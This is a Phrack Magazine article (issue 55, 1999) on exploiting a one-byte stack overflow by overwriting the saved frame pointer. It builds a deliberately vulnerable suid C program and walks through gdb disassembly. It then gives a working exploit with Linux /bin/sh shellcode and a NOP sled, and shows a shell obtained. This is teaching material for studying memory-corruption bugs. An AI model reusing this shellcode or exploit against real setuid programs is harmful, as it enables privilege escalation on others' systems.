@@ -1,0 +1,601 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Frame Pointer Overwriting ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a class="current" href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack55.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack55.tar.gz" title="Get current issue tar.gz">55</a> | <strong>Release date</strong> : <b>1999-09-09</b> | <strong>Editor</strong> : <b>route</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/55/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/55/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/55/3.html#article">Phrack Line Noise</a></td><td align="right">various</td></tr>
+<tr><td align="left"><a href="../../issues/55/4.html#article">Phrack Tribute to W. Richard Stevens</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/55/5.html#article">A Real NT Rootkit</a></td><td align="right">Greg Hoglund</td></tr>
+<tr><td align="left"><a href="../../issues/55/6.html#article">The Libnet Reference Manual</a></td><td align="right">route</td></tr>
+<tr><td align="left"><a href="../../issues/55/7.html#article">PERL CGI Problems</a></td><td align="right">rfp</td></tr>
+<tr><td align="left"><a href="../../issues/55/8.html#article">Frame Pointer Overwriting</a></td><td align="right">klog</td></tr>
+<tr><td align="left"><a href="../../issues/55/9.html#article">Distributed Information Gathering</a></td><td align="right">hybrid</td></tr>
+<tr><td align="left"><a href="../../issues/55/10.html#article">Building Bastion Routers with IOS</a></td><td align="right">Variable K &amp; Brett</td></tr>
+<tr><td align="left"><a href="../../issues/55/11.html#article">Stego Hasho</a></td><td align="right">Conehead</td></tr>
+<tr><td align="left"><a href="../../issues/55/12.html#article">Building Into The Linux Network Layer</a></td><td align="right">lifeline &amp; kossak</td></tr>
+<tr><td align="left"><a href="../../issues/55/13.html#article">The Black Book of AFS</a></td><td align="right">nicnoc</td></tr>
+<tr><td align="left"><a href="../../issues/55/14.html#article">A Global Positioning System Primer</a></td><td align="right">e5</td></tr>
+<tr><td align="left"><a href="../../issues/55/15.html#article">Win32 Buffer Overflows...</a></td><td align="right">dark spyrit</td></tr>
+<tr><td align="left"><a href="../../issues/55/16.html#article">Distributed Metastasis...</a></td><td align="right">Andrew J. Stewart</td></tr>
+<tr><td align="left"><a href="../../issues/55/17.html#article">H.323 Firewall Security Issues</a></td><td align="right">Dan Moniz</td></tr>
+<tr><td align="left"><a href="../../issues/55/18.html#article">Phrack World News</a></td><td align="right">disorder</td></tr>
+<tr><td align="left"><a href="../../issues/55/19.html#article">Phrack Magazine Extraction Utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Frame Pointer Overwriting</div>
+<div class="opt-bottom"> <strong>Author</strong> : klog</div>
+<pre>-------[  Phrack Magazine --- Vol. 9 | Issue 55 --- 09.09.99 --- 08 of 19  ]
+
+
+-------------------------[  The Frame Pointer Overwrite  ]
+
+
+--------[  klog &lt;klog@promisc.org&gt;  ]
+
+
+----[  Introduction
+
+Buffers can be overflowed, and by overwriting critical data stored in the
+target process's address space, we can modify its execution flow.  This is
+old news.  This article is not much about how to exploit buffer overflows,
+nor does it explain the vulnerability itself.  It just demonstrates it is
+possible to exploit such a vulnerability even under the worst conditions,
+like when the target buffer can only be overflowed by one byte.  Many other
+esoteric techniques where the goal is to exploit trusted processes in
+the most hostile situations exist, including when privileges are dropped.
+We will only cover the one byte overflow here.
+
+
+----[  The object of our attack
+
+Lets write a pseudo vulnerable suid program, which we will call &quot;suid&quot;.  It
+is written such that only one byte overflows from its buffer.
+
+	ipdev:~/tests$ cat &gt; suid.c
+	#include &lt;stdio.h&gt;
+
+	func(char *sm)
+	{
+        	char buffer[256];
+        	int i;
+        	for(i=0;i&lt;=256;i++)
+                	buffer[i]=sm[i];
+	}
+
+	main(int argc, char *argv[])
+	{
+        	if (argc &lt; 2) {
+                	printf(&quot;missing args\n&quot;);
+                	exit(-1);
+        	}
+
+	        func(argv[1]);
+	}
+	^D
+	ipdev:~/tests$ gcc suid.c -o suid
+	ipdev:~/tests$
+
+As you can see, we won't have much space to exploit this program.  In fact, the
+overflow is caused only by one byte exceeding the buffer's storage space.  We
+will have to use this byte cleverly.  Before exploiting anything, we should
+take a look at what this byte really overwrites (you probably already know it,
+but hell, who cares). Let's reassemble the stack using gdb, at the moment the
+overflow occurs.
+
+	ipdev:~/tests$ gdb ./suid
+	...
+	(gdb) disassemble func
+	Dump of assembler code for function func:
+	0x8048134 &lt;func&gt;:       pushl  %ebp
+	0x8048135 &lt;func+1&gt;:     movl   %esp,%ebp
+	0x8048137 &lt;func+3&gt;:     subl   $0x104,%esp
+	0x804813d &lt;func+9&gt;:     nop
+	0x804813e &lt;func+10&gt;:    movl   $0x0,0xfffffefc(%ebp)
+	0x8048148 &lt;func+20&gt;:    cmpl   $0x100,0xfffffefc(%ebp)
+	0x8048152 &lt;func+30&gt;:    jle    0x8048158 &lt;func+36&gt;
+	0x8048154 &lt;func+32&gt;:    jmp    0x804817c &lt;func+72&gt;
+	0x8048156 &lt;func+34&gt;:    leal   (%esi),%esi
+	0x8048158 &lt;func+36&gt;:    leal   0xffffff00(%ebp),%edx
+	0x804815e &lt;func+42&gt;:    movl   %edx,%eax
+	0x8048160 &lt;func+44&gt;:    addl   0xfffffefc(%ebp),%eax
+	0x8048166 &lt;func+50&gt;:    movl   0x8(%ebp),%edx
+	0x8048169 &lt;func+53&gt;:    addl   0xfffffefc(%ebp),%edx
+	0x804816f &lt;func+59&gt;:    movb   (%edx),%cl
+	0x8048171 &lt;func+61&gt;:    movb   %cl,(%eax)
+	0x8048173 &lt;func+63&gt;:    incl   0xfffffefc(%ebp)
+	0x8048179 &lt;func+69&gt;:    jmp    0x8048148 &lt;func+20&gt;
+	0x804817b &lt;func+71&gt;:    nop
+	0x804817c &lt;func+72&gt;:    movl   %ebp,%esp
+	0x804817e &lt;func+74&gt;:    popl   %ebp
+	0x804817f &lt;func+75&gt;:    ret
+	End of assembler dump.
+	(gdb)
+
+As we all know, the processor will first push %eip into the stack, as the
+CALL instruction requires.  Next, our small program pushes %ebp over it, as
+seen at *0x8048134.  Finally, it activates a local frame by decrementing %esp
+by 0x104.  This means our local variables will be 0x104 bytes big (0x100 for
+the string, 0x004 for the integer).  Please note that the variables are
+physically padded to the first 4 bytes, so a 255 byte buffer would take up as
+much space as a 256 byte buffer.  We can now tell what our stack looked like
+before the overflow occurred:
+
+	saved_eip
+	saved_ebp
+	char buffer[255]
+	char buffer[254]
+	    ...
+	char buffer[000]
+	int i
+
+This means that the overflowing byte will overwrite the saved frame pointer,
+which was pushed into the stack at the beginning of func().  But how can this
+byte be used to modify the programs execution flow?  Let's take a look at what
+happens with %ebp's image.  We already know that it is restored at the end of
+func(), as we can see at *0x804817e.  But what next?
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x8048180 &lt;main&gt;:       pushl  %ebp
+	0x8048181 &lt;main+1&gt;:     movl   %esp,%ebp
+	0x8048183 &lt;main+3&gt;:     cmpl   $0x1,0x8(%ebp)
+	0x8048187 &lt;main+7&gt;:     jg     0x80481a0 &lt;main+32&gt;
+	0x8048189 &lt;main+9&gt;:     pushl  $0x8058ad8
+	0x804818e &lt;main+14&gt;:    call   0x80481b8 &lt;printf&gt;
+	0x8048193 &lt;main+19&gt;:    addl   $0x4,%esp
+	0x8048196 &lt;main+22&gt;:    pushl  $0xffffffff
+	0x8048198 &lt;main+24&gt;:    call   0x804d598 &lt;exit&gt;
+	0x804819d &lt;main+29&gt;:    addl   $0x4,%esp
+	0x80481a0 &lt;main+32&gt;:    movl   0xc(%ebp),%eax
+	0x80481a3 &lt;main+35&gt;:    addl   $0x4,%eax
+	0x80481a6 &lt;main+38&gt;:    movl   (%eax),%edx
+	0x80481a8 &lt;main+40&gt;:    pushl  %edx
+	0x80481a9 &lt;main+41&gt;:    call   0x8048134 &lt;func&gt;
+	0x80481ae &lt;main+46&gt;:    addl   $0x4,%esp
+	0x80481b1 &lt;main+49&gt;:    movl   %ebp,%esp
+	0x80481b3 &lt;main+51&gt;:    popl   %ebp
+	0x80481b4 &lt;main+52&gt;:    ret
+	0x80481b5 &lt;main+53&gt;:    nop
+	0x80481b6 &lt;main+54&gt;:    nop
+	0x80481b7 &lt;main+55&gt;:    nop
+	End of assembler dump.
+	(gdb)
+
+Great!  After func() has been called, at the end of main(), %ebp will be
+restored into %esp, as seen at *0x80481b1.  This means that we can set %esp to
+an arbitrary value.  But remember, this arbitrary value is not *really*
+arbitrary, since you can only modify the last %esp's byte.  Let's check to see
+if we're right.
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x8048180 &lt;main&gt;:       pushl  %ebp
+	0x8048181 &lt;main+1&gt;:     movl   %esp,%ebp
+	0x8048183 &lt;main+3&gt;:     cmpl   $0x1,0x8(%ebp)
+	0x8048187 &lt;main+7&gt;:     jg     0x80481a0 &lt;main+32&gt;
+	0x8048189 &lt;main+9&gt;:     pushl  $0x8058ad8
+	0x804818e &lt;main+14&gt;:    call   0x80481b8 &lt;printf&gt;
+	0x8048193 &lt;main+19&gt;:    addl   $0x4,%esp
+	0x8048196 &lt;main+22&gt;:    pushl  $0xffffffff
+	0x8048198 &lt;main+24&gt;:    call   0x804d598 &lt;exit&gt;
+	0x804819d &lt;main+29&gt;:    addl   $0x4,%esp
+	0x80481a0 &lt;main+32&gt;:    movl   0xc(%ebp),%eax
+	0x80481a3 &lt;main+35&gt;:    addl   $0x4,%eax
+	0x80481a6 &lt;main+38&gt;:    movl   (%eax),%edx
+	0x80481a8 &lt;main+40&gt;:    pushl  %edx
+	0x80481a9 &lt;main+41&gt;:    call   0x8048134 &lt;func&gt;
+	0x80481ae &lt;main+46&gt;:    addl   $0x4,%esp
+	0x80481b1 &lt;main+49&gt;:    movl   %ebp,%esp
+	0x80481b3 &lt;main+51&gt;:    popl   %ebp
+	0x80481b4 &lt;main+52&gt;:    ret
+	0x80481b5 &lt;main+53&gt;:    nop
+	0x80481b6 &lt;main+54&gt;:    nop
+	0x80481b7 &lt;main+55&gt;:    nop
+	End of assembler dump.
+	(gdb) break *0x80481b4
+	Breakpoint 2 at 0x80481b4
+	(gdb) run `overflow 257`
+	Starting program: /home/klog/tests/suid `overflow 257`
+
+	Breakpoint 2, 0x80481b4 in main ()
+	(gdb) info register esp
+	esp            0xbffffd45       0xbffffd45
+	(gdb)
+
+It seems we were.  After overflowing the buffer by one 'A' (0x41), %ebp is
+moved into %esp, which is incremented by 4 since %ebp is poped from the
+stack just before the RET.  This gives us 0xbffffd41 + 0x4 = 0xbffffd45.
+
+
+----[  Getting prepared
+
+What does changing the stack pointer give us?  We cannot change the saved %eip
+value directly like in any conventional buffer overflow exploitation, but we
+can make the processor think it is elsewhere.  When the processor returns
+from a procedure, it only pops the first word on the stack, guessing it is
+the original %eip.  But if we alter %esp, we can make the processor pop any
+value from the stack as if it was %eip, and thus changing the execution flow.
+Lets project to overflow the buffer using the following string:
+
+	[nops][shellcode][&amp;shellcode][%ebp_altering_byte]
+
+In order to do this, we should first determine what value we want to alter
+%ebp (and thus %esp) with.  Let's take a look at what the stack will look like
+when the buffer overflow will have occurred:
+
+	saved_eip
+	saved_ebp (altered by 1 byte)   
+	&amp;shellcode			\
+	shellcode			 |  char buffer 
+	nops				/
+	int i
+
+Here, we want %esp to point to &amp;shellcode, so that the shellcode's address
+will be poped into %eip when the processor will return from main().  Now that
+we have the full knowledge of how we want to exploit our vulnerable program,
+we need to extract information from the process while running in the context
+it will be while being exploited.  This information consists of the address of
+the overflowed buffer, and the address of the pointer to our shellcode
+(&amp;shellcode).  Let's run the program as if we wanted to overflow it with a 257
+bytes string.  In order to do this, we must write a fake exploit which will
+reproduce the context in which we exploit the vulnerable process.
+
+	(gdb) q
+	ipdev:~/tests$ cat &gt; fake_exp.c
+	#include &lt;stdio.h&gt;
+	#include &lt;unistd.h&gt;
+
+	main()
+	{
+        	int i;
+        	char buffer[1024];
+	
+	        bzero(&amp;buffer, 1024);
+	        for (i=0;i&lt;=256;i++)	
+	        {
+	                buffer[i] = 'A';
+	        }
+	        execl(&quot;./suid&quot;, &quot;suid&quot;, buffer, NULL);
+	}
+	^D
+	ipdev:~/tests$ gcc fake_exp.c -o fake_exp
+	ipdev:~/tests$ gdb --exec=fake_exp --symbols=suid
+	...
+	(gdb) run
+	Starting program: /home/klog/tests/exp2
+
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0x8048090 in ___crt_dummy__ ()
+	(gdb) disassemble func
+	Dump of assembler code for function func:
+	0x8048134 &lt;func&gt;:       pushl  %ebp
+	0x8048135 &lt;func+1&gt;:     movl   %esp,%ebp
+	0x8048137 &lt;func+3&gt;:     subl   $0x104,%esp
+	0x804813d &lt;func+9&gt;:     nop
+	0x804813e &lt;func+10&gt;:    movl   $0x0,0xfffffefc(%ebp)
+	0x8048148 &lt;func+20&gt;:    cmpl   $0x100,0xfffffefc(%ebp)
+	0x8048152 &lt;func+30&gt;:    jle    0x8048158 &lt;func+36&gt;
+	0x8048154 &lt;func+32&gt;:    jmp    0x804817c &lt;func+72&gt;
+	0x8048156 &lt;func+34&gt;:    leal   (%esi),%esi
+	0x8048158 &lt;func+36&gt;:    leal   0xffffff00(%ebp),%edx
+	0x804815e &lt;func+42&gt;:    movl   %edx,%eax
+	0x8048160 &lt;func+44&gt;:    addl   0xfffffefc(%ebp),%eax
+	0x8048166 &lt;func+50&gt;:    movl   0x8(%ebp),%edx
+	0x8048169 &lt;func+53&gt;:    addl   0xfffffefc(%ebp),%edx
+	0x804816f &lt;func+59&gt;:    movb   (%edx),%cl
+	0x8048171 &lt;func+61&gt;:    movb   %cl,(%eax)
+	0x8048173 &lt;func+63&gt;:    incl   0xfffffefc(%ebp)
+	0x8048179 &lt;func+69&gt;:    jmp    0x8048148 &lt;func+20&gt;
+	0x804817b &lt;func+71&gt;:    nop
+	0x804817c &lt;func+72&gt;:    movl   %ebp,%esp
+	0x804817e &lt;func+74&gt;:    popl   %ebp
+	0x804817f &lt;func+75&gt;:    ret
+	End of assembler dump.
+	(gdb) break *0x804813d
+	Breakpoint 1 at 0x804813d
+	(gdb) c
+	Continuing.
+
+	Breakpoint 1, 0x804813d in func ()
+	(gdb) info register esp
+	esp            0xbffffc60       0xbffffc60
+	(gdb)
+
+Bingo.  We now have %esp just after the func's frame have been activated.
+From this value, we can now guess that our buffer will be located at address
+0xbffffc60 + 0x04 (size of 'int i') = 0xbffffc64, and that the pointer to our
+shellcode will be placed at address 0xbffffc64 + 0x100 (size of 'char
+buffer[256]') - 0x04 (size of our pointer) = 0xbffffd60.
+
+
+----[  Time to attack
+
+Having those values will enable us to write a full version of the exploit,
+including the shellcode, the shellcode pointer and the overwriting byte.  The
+value we need to overwrite the saved %ebp's last byte will be 0x60 - 0x04
+= 0x5c since, as you remember, we pop %ebp juste before returning from main().
+These 4 bytes will compensate for %ebp being removed from the stack.  As for
+the pointer to our shellcode, we don't really need to have it point to an exact
+address.  All we need is to make the processor return in the middle of the
+nops between the beginning of the overflowed buffer (0xbffffc64) and our
+shellcode (0xbffffc64 - sizeof(shellcode)), like in a usual buffer overflow.
+Let's use 0xbffffc74.
+
+	ipdev:~/tests$ cat &gt; exp.c
+	#include &lt;stdio.h&gt;
+	#include &lt;unistd.h&gt;
+
+	char sc_linux[] =
+	        &quot;\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07&quot;
+	        &quot;\x89\x56\x0f\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12&quot;
+	        &quot;\x8d\x4e\x0b\x8b\xd1\xcd\x80\x33\xc0\x40\xcd\x80\xe8&quot;
+	        &quot;\xd7\xff\xff\xff/bin/sh&quot;;
+
+	main()
+	{
+        	int i, j;
+        	char buffer[1024];
+
+        	bzero(&amp;buffer, 1024);
+        	for (i=0;i&lt;=(252-sizeof(sc_linux));i++)
+        	{
+                	buffer[i] = 0x90;
+        	}
+        	for (j=0,i=i;j&lt;(sizeof(sc_linux)-1);i++,j++)
+        	{
+        	        buffer[i] = sc_linux[j];
+        	}
+        	buffer[i++] = 0x74; /*
+       		buffer[i++] = 0xfc;  * Address of our buffer
+        	buffer[i++] = 0xff;  *
+        	buffer[i++] = 0xbf;  */
+        	buffer[i++] = 0x5c;
+
+        	execl(&quot;./suid&quot;, &quot;suid&quot;, buffer, NULL);
+
+	}
+	^D
+	ipdev:~/tests$ gcc exp.c -o exp
+	ipdev:~/tests$ ./exp
+	bash$
+
+Great!  Let's take a better look at what really happened.  Although we built
+our exploit around the theory I just put in this paper, it would be nice
+to watch everything get tied together.  You can stop reading right now if
+you understood everything explained previously, and start looking for
+vulnerabilities.
+
+	ipdev:~/tests$ gdb --exec=exp --symbols=suid
+	...
+	(gdb) run
+	Starting program: /home/klog/tests/exp
+
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0x8048090 in ___crt_dummy__ ()
+	(gdb)
+
+Let's first put some breakpoints to watch our careful exploitation of our
+suid program occur in front of our eyes.  We should try to follow the value of
+our overwritten frame pointer until our shellcode starts getting executed.
+
+	(gdb) disassemble func
+	Dump of assembler code for function func:
+	0x8048134 &lt;func&gt;:       pushl  %ebp
+	0x8048135 &lt;func+1&gt;:     movl   %esp,%ebp
+	0x8048137 &lt;func+3&gt;:     subl   $0x104,%esp
+	0x804813d &lt;func+9&gt;:     nop
+	0x804813e &lt;func+10&gt;:    movl   $0x0,0xfffffefc(%ebp)
+	0x8048148 &lt;func+20&gt;:    cmpl   $0x100,0xfffffefc(%ebp)
+	0x8048152 &lt;func+30&gt;:    jle    0x8048158 &lt;func+36&gt;
+	0x8048154 &lt;func+32&gt;:    jmp    0x804817c &lt;func+72&gt;
+	0x8048156 &lt;func+34&gt;:    leal   (%esi),%esi	
+	0x8048158 &lt;func+36&gt;:    leal   0xffffff00(%ebp),%edx
+	0x804815e &lt;func+42&gt;:    movl   %edx,%eax
+	0x8048160 &lt;func+44&gt;:    addl   0xfffffefc(%ebp),%eax
+	0x8048166 &lt;func+50&gt;:    movl   0x8(%ebp),%edx
+	0x8048169 &lt;func+53&gt;:    addl   0xfffffefc(%ebp),%edx
+	0x804816f &lt;func+59&gt;:    movb   (%edx),%cl
+	0x8048171 &lt;func+61&gt;:    movb   %cl,(%eax)
+	0x8048173 &lt;func+63&gt;:    incl   0xfffffefc(%ebp)
+	0x8048179 &lt;func+69&gt;:    jmp    0x8048148 &lt;func+20&gt;
+	0x804817b &lt;func+71&gt;:    nop
+	0x804817c &lt;func+72&gt;:    movl   %ebp,%esp
+	0x804817e &lt;func+74&gt;:    popl   %ebp
+	0x804817f &lt;func+75&gt;:    ret
+	End of assembler dump.
+	(gdb) break *0x804817e
+	Breakpoint 1 at 0x804817e
+	(gdb) break *0x804817f
+	Breakpoint 2 at 0x804817f
+	(gdb)
+
+Those first breakpoints will enable us to monitor the content of %ebp before
+and after being poped from the stack.  These values will correspond to the
+original and overwritten values.
+
+	(gdb) disassemble main
+	Dump of assembler code for function main:
+	0x8048180 &lt;main&gt;:       pushl  %ebp
+	0x8048181 &lt;main+1&gt;:     movl   %esp,%ebp
+	0x8048183 &lt;main+3&gt;:     cmpl   $0x1,0x8(%ebp)
+	0x8048187 &lt;main+7&gt;:     jg     0x80481a0 &lt;main+32&gt;
+	0x8048189 &lt;main+9&gt;:     pushl  $0x8058ad8
+	0x804818e &lt;main+14&gt;:    call   0x80481b8 &lt;_IO_printf&gt;
+	0x8048193 &lt;main+19&gt;:    addl   $0x4,%esp
+	0x8048196 &lt;main+22&gt;:    pushl  $0xffffffff
+	0x8048198 &lt;main+24&gt;:    call   0x804d598 &lt;exit&gt;
+	0x804819d &lt;main+29&gt;:    addl   $0x4,%esp
+	0x80481a0 &lt;main+32&gt;:    movl   0xc(%ebp),%eax
+	0x80481a3 &lt;main+35&gt;:    addl   $0x4,%eax
+	0x80481a6 &lt;main+38&gt;:    movl   (%eax),%edx
+	0x80481a8 &lt;main+40&gt;:    pushl  %edx
+	0x80481a9 &lt;main+41&gt;:    call   0x8048134 &lt;func&gt;
+	0x80481ae &lt;main+46&gt;:    addl   $0x4,%esp
+	0x80481b1 &lt;main+49&gt;:    movl   %ebp,%esp
+	0x80481b3 &lt;main+51&gt;:    popl   %ebp
+	0x80481b4 &lt;main+52&gt;:    ret
+	0x80481b5 &lt;main+53&gt;:    nop
+	0x80481b6 &lt;main+54&gt;:    nop
+	0x80481b7 &lt;main+55&gt;:    nop
+	End of assembler dump.
+	(gdb) break *0x80481b3
+	Breakpoint 3 at 0x80481b3
+	(gdb) break *0x80481b4
+	Breakpoint 4 at 0x80481b4
+	(gdb)
+
+Here we want to monitor the transfer of our overwritten %ebp to %esp and
+the content of %esp until a return from main() occurs.  Let's run the program.
+
+	(gdb) c
+	Continuing.
+
+	Breakpoint 1, 0x804817e in func ()
+	(gdb) info reg ebp
+	ebp            0xbffffd64       0xbffffd64
+	(gdb) c
+	Continuing.
+
+	Breakpoint 2, 0x804817f in func ()
+	(gdb) info reg ebp
+	ebp            0xbffffd5c       0xbffffd5c
+	(gdb) c
+	Continuing.
+
+	Breakpoint 3, 0x80481b3 in main ()
+	(gdb) info reg esp
+	esp            0xbffffd5c       0xbffffd5c
+	(gdb) c
+	Continuing.
+
+	Breakpoint 4, 0x80481b4 in main ()
+	(gdb) info reg esp
+	esp            0xbffffd60       0xbffffd60
+	(gdb)
+
+At first, we see the original value of %ebp.  After being poped from the
+stack, we can see it being replaced by the one which has been overwritten
+by the last byte of our overflowing string, 0x5c.  After that, %ebp is
+moved to %esp, and finally, after %ebp is being poped from the stack again,
+%esp is incremented by 4 bytes. It gives us the final value of 0xbffffd60.
+Let's take a look at what stands there.
+
+	(gdb) x 0xbffffd60
+	0xbffffd60 &lt;__collate_table+3086619092&gt;:        0xbffffc74
+	(gdb) x/10 0xbffffc74
+	0xbffffc74 &lt;__collate_table+3086618856&gt;:        0x90909090      
+	0x90909090	0x90909090       0x90909090
+	0xbffffc84 &lt;__collate_table+3086618872&gt;:        0x90909090      
+	0x90909090	0x90909090       0x90909090
+	0xbffffc94 &lt;__collate_table+3086618888&gt;:        0x90909090      
+	0x90909090
+	(gdb)
+
+We can see that 0xbffffd60 is the actual address of a pointer pointing in the
+middle of the nops just before of our shellcode.  When the processor will
+return from main(), it will pop this pointer into %eip, and jump at the exact
+address of 0xbffffc74.  This is when our shellcode will be executed.
+
+	(gdb) c
+	Continuing.
+
+	Program received signal SIGTRAP, Trace/breakpoint trap.
+	0x40000990 in ?? ()
+	(gdb) c
+	Continuing.
+	bash$ 
+
+
+----[  Conclusions
+
+Although the technique seems nice, some problems remain unresolved.
+Altering a program's execution flow with only one byte of overwriting data
+is, for sure, possible, but under what conditions?  As a matter of fact,
+reproducing the exploitation context can be a hard task in a hostile
+environment, or worst, on a remote host.  It would require us to guess the
+exact stack size of our target process.  To this problem we add the necessity
+of our overflowed buffer to be right next to the saved frame pointer, which
+means it must be the first variable to be declared in its function.  Needless
+to say, padding must also be taken in consideration.  And what about attacking
+big endian architectures?  We cannot afford to be only able to overwrite the
+most significant byte of the frame pointer, unless we have the ability to
+reach this altered address...
+
+Conclusions could be drawn from this nearly impossible to exploit situation.
+Although I would be surprised to hear of anyone having applied this technique
+to a real world vulnerability, it for sure proves us that there is no such
+thing as a big or small overflow, nor is there such thing as a big or small
+vulnerability.  Any flaw is exploitable, all you need is to find out how.
+
+Thanks to: binf, rfp, halflife, route
+
+
+----[  EOF
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
